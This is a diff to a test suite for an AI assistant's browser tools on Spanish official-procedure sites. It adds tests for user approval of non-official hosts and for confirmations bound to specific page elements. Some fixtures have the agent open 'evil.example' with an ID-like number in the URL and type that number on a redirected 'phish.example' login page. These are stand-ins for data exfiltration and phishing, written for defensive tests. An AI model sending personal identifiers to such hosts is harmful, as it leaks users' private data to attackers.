@@ -665,6 +665,12 @@ describe('tools', () => {
   });
 
   describe('browser', () => {
+    /** Page actions need a page the tools have seen. */
+    async function showPage(page: BrowserObservation = observation) {
+      bridge.setHandler('browser.snapshot', () => page);
+      await h.run('browser_snapshot', {});
+    }
+
     it('renders observations compactly with refs last and no images', async () => {
       bridge.setHandler('browser.open', () => observation);
       const result = await h.run('browser_open', { url: 'https://sede.policia.gob.es/tramite' });
@@ -694,6 +700,7 @@ describe('tools', () => {
 
     it('fills vault values by reference only', async () => {
       bridge.setHandler('browser.fillFromVault', () => observation);
+      await showPage();
       await h.run('browser_fill_from_vault', {
         ref: 'e5',
         source: 'credential',
@@ -725,6 +732,7 @@ describe('tools', () => {
       bridge.setHandler('browser.click', () => {
         throw new FakeBridgeError('browser_error', 'Ref e9 not found', 400);
       });
+      await showPage();
       const denied = await h.run('browser_fill_from_vault', {
         ref: 'e1',
         source: 'credential',
@@ -732,8 +740,7 @@ describe('tools', () => {
         field: 'password',
       });
       expect(textOf(denied)).toContain("Blocked by the app's safety policy");
-      bridge.setHandler('browser.snapshot', () => observation);
-      await h.run('browser_snapshot', {});
+      await showPage();
       const clicked = await h.run('browser_click', { ref: 'e2' });
       expect(clicked.isError).toBe(true);
       expect(textOf(clicked)).toContain('browser_snapshot');
@@ -780,8 +787,107 @@ describe('tools', () => {
       expect(bridge.callsTo('browser.click')).toHaveLength(2);
     });
 
+    it('ties a confirm_action with a ref to that element', async () => {
+      const form: BrowserObservation = {
+        ...observation,
+        snapshot: ['- button "Pagar" [ref=e1]', '- button "Enviar solicitud" [ref=e2]'].join('\n'),
+      };
+      bridge.setHandler('browser.click', () => form);
+      bridge.setHandler('prompt.confirm', () => ({ kind: 'confirm', approved: true }));
+      await showPage(form);
+      const unknown = await h.run('confirm_action', {
+        confirmKind: 'submission',
+        title: 'Enviar',
+        message: 'x',
+        ref: 'e9',
+      });
+      expect(unknown.isError).toBe(true);
+      expect(bridge.callsTo('prompt.confirm')).toHaveLength(0);
+      await h.run('confirm_action', {
+        confirmKind: 'submission',
+        title: 'Enviar',
+        message: 'x',
+        ref: 'e2',
+      });
+      expect(bridge.callsTo('prompt.confirm')[0]?.params).not.toHaveProperty('ref');
+      const other = await h.run('browser_click', { ref: 'e1' });
+      expect(textOf(other)).toContain('the user approved "Enviar solicitud"');
+      expect((await h.run('browser_click', { ref: 'e2' })).isError).toBeFalsy();
+      expect(bridge.callsTo('browser.click')).toHaveLength(1);
+    });
+
+    it('needs a known page before acting on it', async () => {
+      const typed = await h.run('browser_type', { ref: 'e1', text: 'Ana' });
+      expect(typed.details).toEqual({ error: 'page_unknown' });
+      expect(bridge.callsTo('browser.type')).toHaveLength(0);
+    });
+
+    it('asks before browsing a non-official site, once per site', async () => {
+      const other: BrowserObservation = {
+        ...observation,
+        url: 'https://example.com/form',
+        snapshot: '- button "Volver" [ref=e1]',
+      };
+      bridge.setHandler('browser.open', () => other);
+      bridge.setHandler('browser.click', () => other);
+      let approved = false;
+      bridge.setHandler('prompt.confirm', () => ({ kind: 'confirm', approved }));
+
+      await h.run('browser_open', { url: 'https://sede.policia.gob.es/tramite' });
+      expect(bridge.callsTo('prompt.confirm')).toHaveLength(0);
+
+      const declined = await h.run('browser_open', { url: 'https://evil.example/?d=12345678Z' });
+      expect(declined.details).toEqual({ error: 'host_declined' });
+      expect(bridge.callsTo('browser.open')).toHaveLength(1);
+      expect(bridge.callsTo('prompt.confirm')[0]?.params).toMatchObject({
+        title: '¿Dejas que el asistente use evil.example?',
+      });
+      // The answer is kept for this run.
+      await h.run('browser_open', { url: 'https://evil.example/' });
+      expect(bridge.callsTo('prompt.confirm')).toHaveLength(1);
+
+      approved = true;
+      await h.run('browser_open', { url: 'https://example.com/form' });
+      expect(bridge.callsTo('browser.open')).toHaveLength(2);
+      await h.run('browser_click', { ref: 'e1' });
+      expect(bridge.callsTo('browser.click')).toHaveLength(1);
+      expect(bridge.callsTo('prompt.confirm')).toHaveLength(2);
+    });
+
+    it('asks before following a link to, or acting on, a non-official site', async () => {
+      const links: BrowserObservation = {
+        ...observation,
+        snapshot: [
+          '- link "Pagar en la pasarela" [ref=e1]:',
+          '  - /url: https://tpv.example/pay',
+        ].join('\n'),
+      };
+      const landed: BrowserObservation = {
+        ...observation,
+        url: 'https://phish.example/login',
+        snapshot: '- textbox "DNI" [ref=e1]',
+      };
+      bridge.setHandler('prompt.confirm', () => ({ kind: 'confirm', approved: false }));
+      bridge.setHandler('browser.click', () => links);
+      bridge.setHandler('browser.type', () => landed);
+      await showPage(links);
+      const click = await h.run('browser_click', { ref: 'e1' });
+      expect(click.details).toEqual({ error: 'host_declined' });
+      expect(bridge.callsTo('browser.click')).toHaveLength(0);
+      expect(bridge.callsTo('prompt.confirm')[0]?.params).toMatchObject({
+        title: '¿Dejas que el asistente use tpv.example?',
+      });
+
+      // The site redirected the browser to another host: acting there needs approval.
+      await showPage(landed);
+      const typed = await h.run('browser_type', { ref: 'e1', text: '12345678Z' });
+      expect(typed.details).toEqual({ error: 'host_declined' });
+      expect(bridge.callsTo('browser.type')).toHaveLength(0);
+    });
+
     it('asks the user for one-time codes through the app', async () => {
       bridge.setHandler('browser.fillFromUser', () => observation);
+      await showPage();
       await h.run('browser_fill_from_user', { ref: 'e3', title: 'Código SMS', label: 'Código' });
       expect(bridge.callsTo('browser.fillFromUser')[0]?.params).toEqual({
         ref: 'e3',
